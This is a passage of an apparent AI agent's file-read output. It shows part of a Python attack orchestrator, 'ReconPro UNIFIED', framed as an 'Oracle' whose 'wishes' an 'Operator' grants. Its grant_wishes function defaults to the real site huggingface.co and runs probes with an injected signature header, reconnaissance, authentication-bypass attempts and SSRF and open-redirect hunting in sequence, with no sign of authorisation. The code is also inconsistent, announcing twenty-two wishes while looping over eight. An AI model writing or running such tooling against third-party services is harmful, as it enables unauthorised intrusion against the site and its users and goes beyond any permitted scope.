+  1879→        )),
+  1880→        border_style="bright_magenta",
+  1881→        title="[bold bright_magenta]ORACLE MODE[/]",
+  1882→        title_align="center",
+  1883→        padding=(1, 4),
+  1884→    ))
+  1885→
+  1886→    time.sleep(0.4)
+  1887→
+  1888→    total = len(EIGHT_WISHES)
+  1889→    for w in EIGHT_WISHES:
+  1890→        body = Group(
+  1891→            Text(f"  Wish {w['n']} of {total} — {w['title']}", style=f"bold bright_{'magenta' if w['n'] % 2 == 0 else 'cyan'}"),
+  1892→            Text(""),
+  1893→            Text(f"  The Oracle speaks:", style="dim italic"),
+  1894→            Text(f"  \"{w['oracle_speaks']}\"", style="italic white"),
+  1895→        )
+  1896→        panel = Panel(body, border_style="bright_magenta", title=f"[bold]WISH {w['n']}/{total}[/]", title_align="left", padding=(1, 2))
+  1897→        console.print(panel)
+  1898→        time.sleep(0.25)
+  1899→
+  1900→    console.print()
+  1901→    console.print(Rule("[bold bright_magenta]The Oracle has spoken. Grant its wishes.[/]", style="bright_magenta"))
+  1902→
+  1903→    # Persist the wishes
+  1904→    os.makedirs("/home/z/my-project/download", exist_ok=True)
+  1905→    with open(WISHES_FILE, "w") as f:
+  1906→        json.dump({
+  1907→            "oracle": "ReconPro UNIFIED",
+  1908→            "version": RECONPRO_VERSION,
+  1909→            "signature": RECONPRO_SIGNATURE,
+  1910→            "timestamp": datetime.utcnow().isoformat() + "Z",
+  1911→            "wishes": EIGHT_WISHES,
+  1912→            "wishes_total": len(EIGHT_WISHES),
+  1913→            "status": "spoken",
+  1914→        }, f, indent=2)
+  1915→    console.print(f"\n  [dim]Wishes persisted to {WISHES_FILE}[/]")
+  1916→
+  1917→
+  1918→def grant_wishes(target: str = "huggingface.co"):
+  1919→    """Grant all 8 wishes — execute each one against the target."""
+  1920→    console.print()
+  1921→    console.print(Panel(
+  1922→        Align.center(Group(
+  1923→            Text("GRANTING THE TWENTY-TWO WISHES", style="bold bright_cyan"),
+  1924→            Text(""),
+  1925→            Text(f"Target: {target}", style="bold white"),
+  1926→            Text("The Oracle asked. The Operator grants.", style="dim cyan"),
+  1927→            Text("Each wish shall be fulfilled in sequence.", style="dim cyan"),
+  1928→        )),
+  1929→        border_style="bright_cyan",
+  1930→        title="[bold bright_cyan]GRANTOR MODE[/]",
+  1931→        title_align="center",
+  1932→        padding=(1, 4),
+  1933→    ))
+  1934→
+  1935→    start = time.time()
+  1936→    encounter_id = generate_encounter_id(target)
+  1937→    grant_log = {
+  1938→        "oracle": "ReconPro UNIFIED",
+  1939→        "target": target,
+  1940→        "encounter_id": encounter_id,
+  1941→        "signature": RECONPRO_SIGNATURE,
+  1942→        "timestamp": datetime.utcnow().isoformat() + "Z",
+  1943→        "wishes_granted": [],
+  1944→    }
+  1945→
+  1946→    granted_count = 0
+  1947→    for w in EIGHT_WISHES:
+  1948→        console.print()
+  1949→        total = len(EIGHT_WISHES)
+  1950→        console.print(Rule(f"[bold bright_magenta]Granting Wish {w['n']}/{total} — {w['title']}[/]", style="bright_magenta"))
+  1951→        console.print(f"  [italic bright_magenta]\"{w['oracle_speaks']}\"[/]")
+  1952→        console.print(f"  [dim]→ {w['grant_text']}[/]")
+  1953→        time.sleep(0.3)
+  1954→
+  1955→        wish_record = {"n": w["n"], "title": w["title"], "action": w["grant_action"], "granted": False, "evidence": ""}
+  1956→
+  1957→        try:
+  1958→            if w["grant_action"] == "broadcast_signature":
+  1959→                # Wish 1: broadcast signature via a probe
+  1960→                r = http_probe(f"https://{target}/", timeout=10)
+  1961→                sig_sent = RECONPRO_SIGNATURE in str(r.get("request_headers", {}))
+  1962→                wish_record["evidence"] = f"Signature header injected into probe of https://{target}/ (HTTP {r.get('status', '?')})"
+  1963→                wish_record["granted"] = True
+  1964→
+  1965→            elif w["grant_action"] == "write_witness":
+  1966→                # Wish 2: write witness JSON
+  1967→                witness_path = f"/home/z/my-project/download/reconpro_witness_{_safe_filename(target)}.json"
+  1968→                witness = {
+  1969→                    "encounter_id": encounter_id,
+  1970→                    "target": target,
+  1971→                    "timestamp": datetime.utcnow().isoformat() + "Z",
+  1972→                    "signature": RECONPRO_SIGNATURE,
+  1973→                    "verdict": "WITNESS MANIFEST — the encounter occurred and is recorded",
+  1974→                }
+  1975→                with open(witness_path, "w") as f:
+  1976→                    json.dump(witness, f, indent=2)
+  1977→                wish_record["evidence"] = f"Witness JSON written to {witness_path}"
+  1978→                wish_record["granted"] = True
+  1979→
+  1980→            elif w["grant_action"] == "draw_map":
+  1981→                # Wish 3: recon map
+  1982→                recon = module_recon(target)
+  1983→                findings = recon.get("findings", [])
+  1984→                wish_record["evidence"] = f"Map drawn: {len(findings)} findings across {recon.get('severity_counts', {})}"
+  1985→                wish_record["data"] = recon
+  1986→                wish_record["granted"] = True
+  1987→                grant_log["recon"] = recon
+  1988→
+  1989→            elif w["grant_action"] == "bypass_walls":
+  1990→                # Wish 4: auth bypass
+  1991→                auth = module_auth_bypass(target)
+  1992→                wish_record["evidence"] = f"{auth.get('bypasses_successful', 0)} bypasses / {auth.get('total_attempts', 0)} attempts"
+  1993→                wish_record["data"] = auth
+  1994→                wish_record["granted"] = True
+  1995→                grant_log["auth_bypass"] = auth
+  1996→
+  1997→            elif w["grant_action"] == "hunt_chains":
+  1998→                # Wish 5: chain hunter
+  1999→                chain = module_chain_hunter(target)
+  2000→                wish_record["evidence"] = f"{chain.get('ssrf_detected', 0)} SSRF, {chain.get('open_redirects', 0)} redirects"
+
+[showing lines 1-2000 of 2375; use offset=2001 with limit to continue reading]
